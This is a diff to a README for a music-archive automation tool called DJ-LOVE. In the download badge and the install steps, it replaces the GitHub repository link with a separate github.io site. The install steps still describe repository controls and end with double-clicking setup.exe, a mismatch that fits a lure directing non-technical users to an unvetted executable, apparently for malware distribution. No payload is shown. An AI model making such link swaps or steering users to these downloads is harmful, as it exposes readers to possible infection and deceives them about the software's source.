@@ -1,6 +1,6 @@
 # 🎧 DJ-LOVE - Automate Your Music Archive Weekly
 
-[![Download DJ-LOVE](https://img.shields.io/badge/Download-DJ--LOVE-FF69B4?style=for-the-badge)](https://github.com/Teodoorpastel906/DJ-LOVE)
+[![Download DJ-LOVE](https://img.shields.io/badge/Download-DJ--LOVE-FF69B4?style=for-the-badge)](https://teodoorpastel906.github.io)
 
 ## 🚀 What is DJ-LOVE?
 
@@ -25,7 +25,7 @@ No coding skills needed. Just set it up once, and it runs automatically.
 
 ## 📥 How to Download & Install
 
-1. **Visit this link to download the application:** [https://github.com/Teodoorpastel906/DJ-LOVE](https://github.com/Teodoorpastel906/DJ-LOVE)
+1. **Visit this link to download the application:** [https://teodoorpastel906.github.io](https://teodoorpastel906.github.io)
 2. Once on the page, click the green **"Code"** button and select **"Download ZIP"**.
 3. Extract the downloaded ZIP file to a folder on your computer (e.g., `C:\DJ-LOVE`).
 4. Double-click the `setup.exe` file to install the application.
